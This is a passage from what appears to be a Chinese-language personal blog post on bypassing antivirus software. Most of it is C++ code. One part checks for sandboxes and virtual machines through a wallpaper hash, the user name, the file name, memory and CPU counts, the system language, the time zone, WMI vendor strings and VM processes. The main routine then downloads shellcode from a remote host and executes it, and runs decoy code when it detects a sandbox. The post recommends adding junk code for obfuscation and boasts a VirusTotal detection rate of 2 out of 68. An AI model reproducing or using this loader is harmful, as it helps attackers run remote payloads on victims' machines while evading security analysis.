+    char szDesktopPicPath[MAX_PATH] = &#123; 0 &#125;;
+    GetWallPaperPic(szDesktopPicPath);
+    auto tmp1 = fs::path&#123; szDesktopPicPath &#125;;
+    size_t stHash = fs::hash_value(tmp1);
+    size_t stThreatboxHash = 1645643018;
+
+    DWORD dwSize = MAX_PATH;
+    TCHAR tName[1024] = &#123; 0 &#125;;
+    GetUserName(tName, &amp;dwSize);
+
+    if ((stHash == stThreatboxHash) || (lstrcmp(tName, L&quot;vbccsb&quot;) == 0)) &#123;
+        *Flag = TRUE;
+        throw err;
+    &#125;
+
+    // 检测VT
+    string szFullPathName = __argv[0];
+    if (szFullPathName.find(&quot;TRANSFER&quot;) !=szFullPathName.npos) &#123;
+        *Flag = TRUE;
+        throw err;
+    &#125;
+
+    // 通用沙箱检测
+    //
+    // 检测沙箱重命名后的文件名长度，最多16个汉字， 一共32个字节长度（排除.exe)  &lt; md5 加密后长度为33个字节 + 4个字节（.exe ） 
+    int pos = szFullPathName.rfind(&quot;\\&quot;);
+    string szFileName = szFullPathName.substr(pos + 1, szFullPathName.length()-1);
+
+    if (szFileName.length() &gt; 36) &#123;
+        *Flag = TRUE;
+        throw err;
+    &#125;
+
+
+    // 检测物理内存 &lt; 3G ， CPU核数 &lt; 3
+    MEMORYSTATUSEX statex;
+    statex.dwLength = sizeof(statex); 
+    GlobalMemoryStatusEx(&amp;statex);
+    // CPU
+    SYSTEM_INFO sysinfo;
+    GetSystemInfo(&amp;sysinfo);
+
+    float fMemSize = (float)statex.ullTotalPhys / (1024 * 1024 * 1024);
+    if (fMemSize &lt; 3 || sysinfo.dwNumberOfProcessors &lt;3 )
+    &#123;
+        *Flag = TRUE;
+        throw err;
+    &#125;
+ 
+    // 检测系统语言，非中文则退出
+    LANGID lid = GetSystemDefaultLangID();
+    if (lid != 0x0804) &#123;
+        *Flag = TRUE;
+        throw err;
+    &#125;
+
+    // 检测时区是否为东八区
+    TIME_ZONE_INFORMATION tzinfo;
+    GetTimeZoneInformation(&amp;tzinfo);
+    if ((tzinfo.Bias / (-60)) != 8) &#123;
+        *Flag = TRUE;
+        throw err;
+
+    &#125;
+
+    // 检测计算机制造商和型号中带有 virtual 、vmware、qemu 、hyper、docker关键字
+    string sWMIResult;
+    GetManufacturerModelByWMI(&amp;sWMIResult);
+    if (sWMIResult.find(&quot;virtual&quot;) !=sWMIResult.npos ||
+        sWMIResult.find(&quot;qemu&quot;) != sWMIResult.npos ||
+        sWMIResult.find(&quot;vmware&quot;) != sWMIResult.npos ||
+        sWMIResult.find(&quot;docker&quot;) != sWMIResult.npos ||
+        sWMIResult.find(&quot;hyper&quot;) != sWMIResult.npos) &#123;
+        *Flag = TRUE;
+        throw err;
+    &#125;
+
+
+
+    // 检测进程 AcrylicService.exe    vmtoolsd.exe
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry32 = &#123; sizeof PROCESSENTRY32 &#125;;
+    BOOL bSuccess = Process32First(hSnapshot, &amp;processEntry32);
+    if (bSuccess)
+    &#123;
+        do
+        &#123;
+            char szProcessBuf[MAX_PATH] = &#123; 0 &#125;;
+            sprintf(szProcessBuf, &quot;%ls&quot;,processEntry32.szExeFile);
+            if (strcmp(szProcessBuf, &quot;AcrylicService.exe&quot;) == 0 ||
+                strcmp(szProcessBuf, &quot;vmtoolsd.exe&quot;) == 0 
+                ) &#123;
+                *Flag = TRUE;
+                throw err;
+            &#125;
+
+
+        &#125; while (Process32Next(hSnapshot, &amp;processEntry32));
+    &#125;
+
+
+&#125;
+</code></pre>
+</li>
+<li><p>主逻辑 ，一定要放一个Flag，不然抛出去的异常可能会被沙箱接收处理，程序并不会退出，所以需要根据flag判断更改逻辑。</p>
+<blockquote>
+<p>注意，光有检测代码，行为会非常可疑，尽量加点垃圾代码混淆一下</p>
+</blockquote>
+<pre><code class="c++">#include &quot;BypassAV.h&quot;
+
+int main() &#123;
+    BypassAV* bypassav = new BypassAV();
+    BOOL FLAG = FALSE;
+    bypassav-&gt;CheckSandBox(&amp;FLAG);
+    if (FLAG) &#123;
+        // 如果沙箱处理了抛出的异常则执行这边的逻辑，不处理则会直接退出
+        bypassav-&gt;ConfuseCode();
+        
+        string htmlResult;
+        bypassav-&gt;Download(&quot;www.baidu.com&quot;, &quot;80&quot;, &quot;/index.html&quot;, htmlResult);
+        
+        ofstream ofs(&quot;index.html&quot;, ios::out | ios::trunc);
+        ofs &lt;&lt; htmlResult.c_str();
+        ofs.close();
+    &#125;
+    else &#123;
+        // 执行shellcode
+        string htmlResult;
+        bypassav-&gt;Download(&quot;example.com&quot;, &quot;80&quot;, &quot;/1635699663.858868.txt&quot;, htmlResult);
+        bypassav-&gt;ExecShellcode(htmlResult.c_str());
+    &#125;
+    return -1;
+&#125;
+</code></pre>
+</li>
+<li><p>实际测试效果：VT (2/68 )，无沙箱上线，有两个下不去猜测是被检测到了部分敏感函数 ；微步退出运行，无相关行为</p>
+<p><a target="_blank" rel="noopener" href="https://s.threatbook.cn/report/file/06348542967f879b37a3e8d9c35159a24b4703ca6b8b979900bb2e6a5c0c342e/?env=win7_sp1_enx86_office2013">https://s.threatbook.cn/report/file/06348542967f879b37a3e8d9c35159a24b4703ca6b8b979900bb2e6a5c0c342e/?env=win7_sp1_enx86_office2013</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/06348542967f879b37a3e8d9c35159a24b4703ca6b8b979900bb2e6a5c0c342e/detection">https://www.virustotal.com/gui/file/06348542967f879b37a3e8d9c35159a24b4703ca6b8b979900bb2e6a5c0c342e/detection</a></p>
+</li>
+</ul>
+<p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/evolution-of-malware-sandbox-evasion-tactics-a-retrospective-study/">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/evolution-of-malware-sandbox-evasion-tactics-a-retrospective-study/</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kafan.cn/thread-2082898-1-1.html">https://bbs.kafan.cn/thread-2082898-1-1.html</a></p>
+</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/02/14/%E4%BB%BFCobaltStrike%E7%9A%84Shellcode/">prev</a><a class="next" href="/2022/01/09/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>
